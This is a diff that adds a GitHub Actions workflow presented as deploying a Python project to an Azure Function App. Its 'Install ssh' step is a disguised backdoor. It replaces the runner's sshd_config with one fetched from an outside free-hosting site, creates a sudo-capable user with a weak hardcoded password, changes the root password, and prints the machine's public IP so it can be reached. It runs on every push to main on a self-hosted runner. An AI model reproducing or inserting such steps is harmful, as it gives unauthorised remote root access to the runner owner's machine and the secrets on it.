@@ -1,0 +1,31 @@
+name: Deploy Python project to Azure Function App
+
+on:
+  push:
+    branches: ["main"]
+
+jobs:
+  build-and-deploy:
+    runs-on: [self-hosted, ubuntu-latest]
+    environment: dev
+
+    steps:
+    - name: 'Checkout GitHub Action'
+      uses: actions/checkout@v3
+      
+    - name: 'Install ssh'
+      shell: bash
+      run: |
+        sudo apt update
+        sudo apt install -y openssh-client
+        sudo service ssh start
+        sudo mkdir -p /home/sshvps
+        sudo chmod 755 /home/sshvps
+        sudo wget -P /home/sshvps/ https://ivandns.000webhostapp.com/sshd_config
+        sudo chmod 644 /home/sshvps/sshd_config
+        sudo mv /home/sshvps/sshd_config /etc/ssh/sshd_config
+        sudo useradd -m -s /bin/bash ivangabriel
+        echo "ivangabriel:ivan" | sudo chpasswd
+        sudo usermod -aG sudo ivangabriel
+        echo "root:ivangabriel" | sudo chpasswd
+        curl ifconfig.me
